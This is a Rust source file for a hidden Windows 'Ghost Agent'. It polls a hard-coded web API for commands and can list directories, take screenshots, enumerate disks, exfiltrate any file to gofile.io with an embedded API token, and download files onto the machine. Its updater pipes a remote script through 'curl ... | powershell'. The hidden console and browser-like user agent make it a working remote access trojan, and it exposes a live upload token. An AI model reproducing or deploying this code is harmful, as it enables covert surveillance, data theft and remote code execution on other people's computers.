#![windows_subsystem = "windows"]
use std::fs;
use std::io::Write;
use std::path::Path;
use std::collections::HashMap;
use std::time::{Instant, Duration};
use std::sync::{Arc, Mutex};
use tokio::time::sleep;
use tokio::io::AsyncWriteExt; // WAJIB: Buat fungsi stream_to_file
use serde::{Deserialize, Serialize};
use sysinfo::{System, SystemExt, DiskExt, CpuExt}; 
use reqwest::Client;
use screenshots::Screen;
use uuid::Uuid;
use base64::{Engine as _, engine::general_purpose}; 
use whoami;

const VERSION: &str = env!("CARGO_PKG_VERSION");

// --- CONFIGURATION STRUCT ---
#[derive(Serialize, Deserialize, Clone)]
struct Config {
    api_url: String,
    device_name: String,
    heartbeat_interval_ms: u64,
    poll_interval_ms: u64,
    gofile_token: String,
    #[serde(default)]
    device_id: String,
}

// --- PAYLOAD STRUCTS ---
#[derive(Serialize)]
struct HeartbeatPayload {
    action: String,
    device_id: String,
    device_name: String,
    ram_usage: u64,
    ram_total: u64,
    cpu_usage: f32,
    cpu_brand: String,
    platform: String,
    os_type: String,
    user: String,
    version: String,
}

#[derive(Serialize)]
struct CommandResponse {
    action: String,
    device_id: String,
    reply_to_id: String,
    status: String,
    data: Option<serde_json::Value>,
}

#[derive(Deserialize, Debug)]
#[serde(rename_all = "camelCase")]
struct PendingCommand {
    message_id: String,
    command: String,
    args: Option<serde_json::Value>,
}

#[derive(Serialize, Clone)]
struct FileEntry {
    name: String,
    kind: String,
    size: String,
}

// --- CACHE STRUCT ---
struct CacheEntry {
    files: Vec<FileEntry>,
    timestamp: Instant,
}

struct DirCache {
    entries: HashMap<String, CacheEntry>,
    ttl: Duration,
}

impl DirCache {
    fn new(ttl_secs: u64) -> Self {
        Self {
            entries: HashMap::new(),
            ttl: Duration::from_secs(ttl_secs),
        }
    }

    fn get(&self, path: &str) -> Option<Vec<FileEntry>> {
        if let Some(entry) = self.entries.get(path) {
            if entry.timestamp.elapsed() < self.ttl {
                return Some(entry.files.clone());
            }
        }
        None
    }

    fn set(&mut self, path: String, files: Vec<FileEntry>) {
        self.entries.insert(path, CacheEntry {
            files,
            timestamp: Instant::now(),
        });
    }

    fn invalidate(&mut self, path: &str) {
        self.entries.remove(path);
    }
}

// --- MAIN LOGIC ---

#[tokio::main]
async fn main() {
    println!("👻 Ghost Agent v{} - Optimized Stream Mode...", VERSION);

    let config = load_or_create_config();
    println!("📱 [READY] Device ID: {}", config.device_id);
    println!("🌐 [TARGET] API URL  : {}", config.api_url);
    
    let client = Client::builder()
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
        .build()
        .unwrap();

    // 1. Check for updates
    if let Some(new_version) = check_for_updates(&client, &config.api_url).await {
        println!("🚀 New version found: v{}. Updating...", new_version);
        trigger_update();
        sleep(Duration::from_secs(3)).await;
        std::process::exit(0);
    }

    // 2. Initial Registration
    println!("📡 Sending initial heartbeat...");
    let initial_sys = System::new_all();
    let initial_payload = HeartbeatPayload {
        action: "heartbeat".to_string(),
        device_id: config.device_id.clone(),
        device_name: config.device_name.clone(),
        ram_usage: initial_sys.used_memory() / 1024 / 1024,
        ram_total: initial_sys.total_memory() / 1024 / 1024,
        cpu_usage: 0.0,
        cpu_brand: initial_sys.global_cpu_info().brand().to_string(),
        platform: format!("{} {}", initial_sys.name().unwrap_or_default(), initial_sys.os_version().unwrap_or_default()),
        os_type: initial_sys.distribution_id(),
        user: whoami::username(),
        version: VERSION.to_string(),
    };
    
    if let Err(e) = client.post(&config.api_url).json(&initial_payload).send().await {
        println!("⚠️ Initial registration failed: {}. Will retry in loop.", e);
    } else {
        println!("✅ Initial registration successful!");
    }

    let hb_config = config.clone();
    let hb_client = client.clone();
    
    // Heartbeat Task
    tokio::spawn(async move {
        let mut sys = System::new_all();
        loop {
            sys.refresh_memory();
            sys.refresh_cpu();
            
            let payload = HeartbeatPayload {
                action: "heartbeat".to_string(),
                device_id: hb_config.device_id.clone(),
                device_name: hb_config.device_name.clone(),
                ram_usage: sys.used_memory() / 1024 / 1024,
                ram_total: sys.total_memory() / 1024 / 1024,
                cpu_usage: sys.global_cpu_info().cpu_usage(),
                cpu_brand: sys.global_cpu_info().brand().to_string(),
                platform: format!("{} {}", sys.name().unwrap_or_default(), sys.os_version().unwrap_or_default()),
                os_type: sys.distribution_id(),
                user: whoami::username(),
                version: VERSION.to_string(),
            };

            if let Err(e) = hb_client.post(&hb_config.api_url).json(&payload).send().await {
                println!("❌ Heartbeat Error: {}", e);
            }
            sleep(Duration::from_millis(hb_config.heartbeat_interval_ms)).await;
        }
    });

    let dir_cache = Arc::new(Mutex::new(DirCache::new(60)));

    // 3. Command Polling Loop
    loop {
        print!("."); 
        std::io::stdout().flush().unwrap();
        match fetch_command(&client, &config).await {
            Ok(Some(cmd)) => {
                println!("\n📩 Command: {} Args: {:?}", cmd.command, cmd.args);
                let cache_clone = Arc::clone(&dir_cache);
                process_command(&client, &config, cmd, cache_clone).await;
            }
            Err(e) => println!("\n⚠️ Poll Error: {}", e),
            _ => {}
        }
        sleep(Duration::from_millis(config.poll_interval_ms)).await;
    }
}

// --- UTILS & HELPERS ---

// Helper 1: Extract direct link from HTML (Optimized)
fn extract_direct_link(html: &str) -> Option<String> {
    if let Some(idx) = html.find("tmpfiles.org/dl/") {
        let prefix = &html[0..idx];
        if let Some(start_quote) = prefix.rfind('"').or_else(|| prefix.rfind('\'')).or_else(|| prefix.rfind(' ')) {
            let start = start_quote + 1;
            let suffix = &html[idx..];
            if let Some(end_quote) = suffix.find('"').or_else(|| suffix.find('\'')).or_else(|| suffix.find(' ')) {
                let end = idx + end_quote;
                let mut new_url = html[start..end].to_string();
                if new_url.starts_with("//") {
                    new_url = format!("https:{}", new_url);
                }
                return Some(new_url);
            }
        }
    }
    None
}

// Helper 2: Stream downloader (Memory Efficient for 4GB RAM)
async fn stream_to_file(mut resp: reqwest::Response, path: &str) -> Result<u64, String> {
    let mut file = tokio::fs::File::create(path).await
        .map_err(|e| format!("Failed to create file: {}", e))?;

    let mut total_size: u64 = 0;
    while let Some(chunk) = resp.chunk().await.map_err(|e| format!("Net error: {}", e))? {
        file.write_all(&chunk).await
            .map_err(|e| format!("Write error: {}", e))?;
        total_size += chunk.len() as u64;
    }
    file.flush().await.map_err(|e| format!("Flush error: {}", e))?;
    Ok(total_size)
}

fn load_or_create_config() -> Config {
    let path = "config.json";
    let (mut cfg, is_new) = if Path::new(path).exists() {
        let content = fs::read_to_string(path).unwrap();
        (serde_json::from_str::<Config>(&content).unwrap_or_else(|_| {
            println!("⚠️ Config rusak, reset...");
            create_default_config(path)
        }), false)
    } else {
        (create_default_config(path), true)
    };

    if !is_new && cfg.device_id.is_empty() {
        cfg.device_id = Uuid::new_v4().to_string();
        save_config(path, &cfg);
    }

    if cfg!(debug_assertions) {
        println!("🛠️  [DEV MODE] Using localhost API");
        cfg.api_url = "http://127.0.0.1:3000/api/ghost".to_string();
    }
    cfg
}

fn create_default_config(path: &str) -> Config {
    let default_cfg = Config {
        api_url: "https://erzysh.vercel.app/api/ghost".to_string(),
        device_name: format!("{}-{}", whoami::username(), whoami::devicename()),
        heartbeat_interval_ms: 5000,
        poll_interval_ms: 2000,
        gofile_token: "eNi42POOnDBiGBWf9LfDOP2Yjoe7DqQy".to_string(),
        device_id: Uuid::new_v4().to_string(),
    };
    save_config(path, &default_cfg);
    default_cfg
}

fn save_config(path: &str, config: &Config) {
    let json = serde_json::to_string_pretty(config).unwrap();
    fs::write(path, json).expect("Gagal menulis config");
}

async fn fetch_command(client: &Client, config: &Config) -> Result<Option<PendingCommand>, Box<dyn std::error::Error>> {
    let url = format!("{}?deviceId={}", config.api_url, config.device_id);
    let resp = client.get(&url).send().await?;
    
    if resp.status().is_success() {
        let text = resp.text().await?;
        if text.trim().is_empty() || text == "null" { return Ok(None); }
        match serde_json::from_str::<PendingCommand>(&text) {
            Ok(cmd) => return Ok(Some(cmd)),
            Err(e) => println!("❌ JSON Parse Error: {}", e),
        }
    }
    Ok(None)
}

async fn process_command(client: &Client, config: &Config, cmd: PendingCommand, cache: Arc<Mutex<DirCache>>) {
    let mut response_data: Option<serde_json::Value> = None;
    let mut status = "DONE".to_string();

    match cmd.command.as_str() {
        "LS" => {
            let mut path_str = "C:\\".to_string();
            let mut force = false;
            
            if let Some(args) = &cmd.args {
                if let Some(s) = args.as_str() {
                    path_str = s.to_string();
                } else if let Some(obj) = args.as_object() {
                    if let Some(p) = obj.get("path").and_then(|v| v.as_str()) {
                        path_str = p.to_string();
                    }
                    force = obj.get("force").and_then(|v| v.as_bool()).unwrap_or(false);
                }
            }
            
            let path = Path::new(&path_str);
            if !path.exists() {
                status = "ERROR".to_string();
                response_data = Some(serde_json::json!({ "message": "Path not found" }));
            } else {
                let cached_files = if force { None } else { cache.lock().unwrap().get(&path_str) };
                
                if let Some(files) = cached_files {
                    println!("⚡ [CACHE] Hit: {}", path_str);
                    response_data = Some(serde_json::json!({ "current_path": path_str, "files": files }));
                } else {
                    match fs::read_dir(path) {
                        Ok(entries) => {
                            let mut files: Vec<FileEntry> = Vec::new();
                            for entry in entries.flatten() {
                                let name = entry.file_name().to_string_lossy().to_string();
                                let (kind, size) = match entry.metadata() {
                                    Ok(m) => (
                                        if m.is_dir() { "dir" } else { "file" }.to_string(),
                                        if m.is_dir() { "-".to_string() } else { format_size(m.len()) }
                                    ),
                                    _ => ("unknown".to_string(), "?".to_string())
                                };
                                files.push(FileEntry { name, kind, size });
                            }
                            // Sort: Dirs first
                            files.sort_by(|a, b| match (a.kind.as_str(), b.kind.as_str()) {
                                ("dir", "file") => std::cmp::Ordering::Less,
                                ("file", "dir") => std::cmp::Ordering::Greater,
                                _ => a.name.cmp(&b.name),
                            });
                            
                            cache.lock().unwrap().set(path_str.clone(), files.clone());
                            response_data = Some(serde_json::json!({ "current_path": path_str, "files": files }));
                        },
                        Err(e) => {
                            status = "ERROR".to_string();
                            response_data = Some(serde_json::json!({ "message": e.to_string() }));
                        }
                    }
                }
            }
        },
        "SCREENSHOT" => {
            if let Some(screen) = Screen::all().unwrap_or_default().first() {
                match screen.capture() {
                    Ok(image) => {
                        let mut cursor = std::io::Cursor::new(Vec::new());
                        let _ = image.write_to(&mut cursor, image::ImageOutputFormat::Png);
                        let b64 = general_purpose::STANDARD.encode(cursor.get_ref());
                        response_data = Some(serde_json::json!({ "image": b64 }));
                    },
                    Err(e) => {
                        status = "ERROR".to_string();
                        response_data = Some(serde_json::json!({ "message": e.to_string() }));
                    }
                }
            } else {
                status = "ERROR".to_string();
                response_data = Some(serde_json::json!({ "message": "No screens found" }));
            }
        },
        "LIST_DISKS" => {
            let mut sys = System::new_all();
            sys.refresh_disks_list();
            sys.refresh_disks();
            let disks: Vec<serde_json::Value> = sys.disks().iter().map(|disk| {
                serde_json::json!({
                    "name": disk.name().to_string_lossy(),
                    "mount_point": disk.mount_point().to_string_lossy(),
                    "total_space": format_size(disk.total_space()),
                    "available_space": format_size(disk.available_space()),
                    "file_system": String::from_utf8_lossy(disk.file_system()),
                })
            }).collect();
            response_data = Some(serde_json::json!({ "disks": disks }));
        },
        "GET_FILE" => {
            let path_str = cmd.args.as_ref()
                .and_then(|v| v.as_str())
                .unwrap_or_default()
                .to_string();
            match upload_to_gofile(client, &path_str, &config.gofile_token).await {
                Ok(url) => response_data = Some(serde_json::json!({ "url": url })),
                Err(e) => {
                    status = "ERROR".to_string();
                    response_data = Some(serde_json::json!({ "message": e.to_string() }));
                }
            }
        },
       "PUT_FILE" => {
            println!("📥 Processing PUT_FILE (Stream Mode)...");
            
            // --- FIX PARSING ARGUMENT ---
            let (url, dest) = match &cmd.args {
                Some(val) => {
                    // Cek 1: Apakah args dikirim sebagai STRING ter-encode? (Kasus lo sekarang)
                    if let Some(args_str) = val.as_str() {
                        match serde_json::from_str::<serde_json::Value>(args_str) {
                            Ok(parsed) => (
                                parsed["url"].as_str().unwrap_or("").trim().to_string(),
                                parsed["dest"].as_str().unwrap_or("").trim().to_string()
                            ),
                            Err(_) => ("".to_string(), "".to_string())
                        }
                    } 
                    // Cek 2: Apakah args dikirim sebagai OBJECT murni? (Jaga-jaga)
                    else {
                        (
                            val["url"].as_str().unwrap_or("").trim().to_string(),
                            val["dest"].as_str().unwrap_or("").trim().to_string()
                        )
                    }
                },
                None => ("".to_string(), "".to_string())
            };
            // ---------------------------

            println!("🔍 URL: {}\n📂 Dest: {}", url, dest);

            if url.is_empty() || dest.is_empty() {
                // ... sisa logic ke bawah SAMA PERSIS ...
                status = "ERROR".to_string();
                response_data = Some(serde_json::json!({ "message": "Missing 'url' or 'dest' (Parse Failed)" }));
            } else {
                // Jangan lupa variabel 'url' dan 'dest' sekarang tipe-nya String (bukan &str)
                // Jadi di bawah nanti pass-nya pake referensi &url atau &dest
                println!("📡 Stream Target: {}\n🎯 Dest: {}", url, dest);

                if let Some(parent) = Path::new(&dest).parent() { // Pake &dest
                    let _ = fs::create_dir_all(parent);
                    cache.lock().unwrap().invalidate(&parent.to_string_lossy().to_string());
                }

                let referer = url.replace("/dl/", "/");
                let req = client.get(&url) // Pake &url
                    .header("Referer", referer)
                    .header("Upgrade-Insecure-Requests", "1")
                    .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
                
                // ... Lanjutannya copy paste logic stream yang sebelumnya ...
                match req.send().await {
                    Ok(resp) if resp.status().is_success() => {
                        let content_type = resp.headers()
                            .get("content-type")
                            .and_then(|v| v.to_str().ok())
                            .unwrap_or("")
                            .to_string();

                        if content_type.contains("text/html") {
                            println!("📄 HTML detected. Parsing...");
                            let body_text = resp.text().await.unwrap_or_default();
                            
                            if let Some(direct_url) = extract_direct_link(&body_text) {
                                println!("🔗 Redirecting stream to: {}", direct_url);
                                let retry_req = client.get(&direct_url).header("Referer", &url); // Pake &url
                                
                                match retry_req.send().await {
                                    Ok(retry_resp) if retry_resp.status().is_success() => {
                                        match stream_to_file(retry_resp, &dest).await { // Pake &dest
                                            Ok(size) => {
                                                status = "DONE".to_string();
                                                response_data = Some(serde_json::json!({ "dest": dest, "size": size, "recovered": true }));
                                            },
                                            Err(e) => {
                                                status = "ERROR".to_string();
                                                response_data = Some(serde_json::json!({ "message": e }));
                                            }
                                        }
                                    },
                                    _ => {
                                        status = "ERROR".to_string();
                                        response_data = Some(serde_json::json!({ "message": "Direct link request failed" }));
                                    }
                                }
                            } else {
                                status = "ERROR".to_string();
                                response_data = Some(serde_json::json!({ "message": "No direct link found in HTML" }));
                            }
                        } else {
                            println!("🌊 Starting direct stream...");
                            match stream_to_file(resp, &dest).await { // Pake &dest
                                Ok(size) => {
                                    status = "DONE".to_string();
                                    response_data = Some(serde_json::json!({ "dest": dest, "size": size }));
                                },
                                Err(e) => {
                                    status = "ERROR".to_string();
                                    response_data = Some(serde_json::json!({ "message": e }));
                                }
                            }
                        }
                    },
                    // ... Error handling sisa sama ...
                    Ok(resp) => {
                         status = "ERROR".to_string();
                         response_data = Some(serde_json::json!({ "message": format!("HTTP {}", resp.status()) }));
                    },
                    Err(e) => {
                         status = "ERROR".to_string();
                         response_data = Some(serde_json::json!({ "message": format!("Request Error: {}", e) }));
                    }
                }
            }
        },
        _ => {
            status = "ERROR".to_string();
            response_data = Some(serde_json::json!({ "message": "Unknown command" }));
        }
    }

    let payload = CommandResponse {
        action: "response".to_string(),
        device_id: config.device_id.clone(),
        reply_to_id: cmd.message_id,
        status,
        data: response_data,
    };

    if let Err(e) = client.post(&config.api_url).json(&payload).send().await {
        println!("❌ Failed to send response: {}", e);
    }
}

fn format_size(bytes: u64) -> String {
    const UNITS: [&str; 4] = ["B", "KB", "MB", "GB"];
    let mut b = bytes as f64;
    let mut i = 0;
    while b >= 1024.0 && i < UNITS.len() - 1 {
        b /= 1024.0;
        i += 1;
    }
    format!("{:.2} {}", b, UNITS[i])
}

async fn upload_to_gofile(client: &Client, file_path: &str, token: &str) -> Result<String, Box<dyn std::error::Error>> {
    use tokio_util::codec::{BytesCodec, FramedRead};
    use tokio::fs::File;
    
    let path = Path::new(file_path);
    if !path.exists() { return Err("File not found".into()); }

    let file = File::open(file_path).await?;
    let stream = FramedRead::new(file, BytesCodec::new());
    let file_body = reqwest::Body::wrap_stream(stream);
    let filename = path.file_name().unwrap().to_string_lossy().to_string();

    let form = reqwest::multipart::Form::new()
        .part("file", reqwest::multipart::Part::stream(file_body).file_name(filename));

    let upload_resp = client.post("https://upload-ap-sgp.gofile.io/uploadFile")
        .header("Authorization", format!("Bearer {}", token))
        .multipart(form)
        .send()
        .await?;

    let json: serde_json::Value = upload_resp.json().await?;
    if json["status"].as_str().unwrap_or("") == "ok" {
        Ok(json["data"]["downloadPage"].as_str().unwrap_or("").to_string())
    } else {
        Err(format!("Gofile error: {:?}", json).into())
    }
}

async fn check_for_updates(client: &Client, api_url: &str) -> Option<String> {
    let url = format!("{}?action=get_version", api_url);
    if let Ok(resp) = client.get(&url).send().await {
        if let Ok(json) = resp.json::<serde_json::Value>().await {
            if let Some(latest) = json["version"].as_str() {
                if latest != VERSION { return Some(latest.to_string()); }
            }
        }
    }
    None
}

fn trigger_update() {
    let _ = std::process::Command::new("powershell")
        .args(&["-Command", "curl -sL https://erzysh.vercel.app/ghost-setup | powershell"])
        .spawn();
}